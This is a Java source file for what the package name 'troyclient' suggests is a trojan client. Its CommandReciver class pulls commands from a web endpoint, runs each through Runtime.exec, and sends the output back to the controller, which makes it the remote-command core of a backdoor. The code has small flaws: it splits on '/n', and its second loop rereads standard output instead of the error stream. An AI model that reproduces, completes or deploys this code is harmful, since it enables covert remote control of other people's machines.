package ch.lebois.troyclient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class CommandReciver {


    private String url = "http://localhost:8080/command";
    private WebHandler webHandler;
    private Sender sender;

    CommandReciver(){
        setUrl(url);
    }

    CommandReciver(String url){
        setUrl(url);
    }


    public void setUrl(String url) {
        this.url = url;
        webHandler =  new WebHandler(url);
        sender = new Sender();
    }

    public void readCommands(){
        String[] commands = webHandler.getContent().split("/n");
        for (String command : commands) {
            try {
                excecute(command);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }


    public void excecute(String command) throws IOException {
        Process pr = null;
        try {
            pr = Runtime.getRuntime().exec(command);

            BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
            BufferedReader err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
            String line;
            while ((line = in.readLine()) != null) {
                System.out.println("command" + line);
                sender.send("result", line);
            }
            while ((line = in.readLine()) != null) {
                System.out.println("command" + line);
                sender.send("result", line);
            }
        } catch (IOException e) {
            sender.send("error", "void");
        }

    }

}
